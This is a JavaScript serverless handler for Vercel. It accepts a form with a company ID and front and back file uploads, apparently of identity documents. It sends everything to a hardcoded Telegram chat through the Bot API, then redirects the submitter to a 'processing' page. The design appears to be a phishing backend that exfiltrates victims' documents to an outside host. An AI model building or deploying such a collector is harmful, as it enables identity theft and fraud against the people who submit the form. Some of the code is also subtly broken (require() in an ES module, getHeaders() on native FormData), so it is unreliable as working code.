import formidable from 'formidable';
import axios from 'axios';

// IMPORTANT: Vercel serverless functions need the exports.default format
export default async function handler(req, res) {
    // 1. Ensure the request is POST
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Use environment variables!
    const CHAT_ID = '8483934112'; // Your chat ID

    // 2. Parse the multipart form data (files + text)
    const form = formidable({});

    const [fields, files] = await form.parse(req);
    
    // Convert fields from array to string
    const companyId = fields.companyId ? fields.companyId[0] : '';

    // Get the file objects
    const frontFile = files.frontUpload ? files.frontUpload[0] : null;
    const backFile = files.backUpload ? files.backUpload[0] : null;

    // --- Helper function to send files ---
    async function sendDocument(chatId, file) {
        if (!file) return;

        const formData = new FormData();
        formData.append('chat_id', chatId);
        
        // Append the file stream
        const fileStream = require('fs').createReadStream(file.filepath);
        formData.append('document', fileStream, file.originalFilename);

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
        
        try {
            await axios.post(url, formData, {
                headers: formData.getHeaders(),
            });
        } catch (error) {
            console.error('Telegram Send Document Error:', error.response ? error.response.data : error.message);
        }
    }
    
    // --- Helper function to send messages ---
    async function sendMessage(chatId, text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await axios.post(url, {
                chat_id: chatId,
                text: text,
            });
        } catch (error) {
            console.error('Telegram Send Message Error:', error.response ? error.response.data : error.message);
        }
    }

    // 3. Execution
    
    // Send company ID message
    if (companyId) {
        await sendMessage(CHAT_ID, `📌 New Submission\nCompany ID: ${companyId}`);
    }

    // Send files
    await sendDocument(CHAT_ID, frontFile);
    await sendDocument(CHAT_ID, backFile);
    
    // Send final confirmation
    await sendMessage(CHAT_ID, "✅ All files and data received successfully.");


    // 4. Redirect the user
    // The serverless function must send a 302 redirect header
    res.setHeader('Location', '/processing.html');
    res.status(302).end();
}
